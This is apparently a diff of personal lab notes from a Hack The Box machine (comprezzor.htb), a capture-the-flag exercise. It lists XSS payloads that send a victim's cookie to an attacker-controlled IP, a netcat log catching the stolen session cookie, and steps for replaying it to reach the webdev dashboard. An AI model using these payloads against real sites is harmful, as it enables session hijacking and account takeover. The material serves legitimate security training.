@@ -37,3 +37,25 @@ Found: dashboard.comprezzor.htb Status: 302 [Size: 251] [--> http://auth.comprez
 <script>var i=new Image(); i.src="http://10.10.14.46:8000?cookie=" + document.cookie;</script>
 <script>var i=new Image(); i.src="http://10.10.14.46:8000/test.js";</script>
 <img src=x onerror=fetch('http://10.10.16.125:4243/'+document.cookie);>
+
+listening on [any] 4243 ...
+connect to [10.10.14.254] from (UNKNOWN) [10.10.11.15] 52462
+GET /user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4 HTTP/1.1
+Host: 10.10.14.254:4243
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://dashboard.comprezzor.htb/
+Origin: http://dashboard.comprezzor.htb
+Connection: keep-alive
+
+it wont let me enter in firefox browser,so i tried to use chromium
+
+entered the inspect , in application tab we changed the user_data cookie to the one we received 
+
+and entered the dashboard.comprezzor.htb in url 
+
+got the Reports - webdev page
+
+
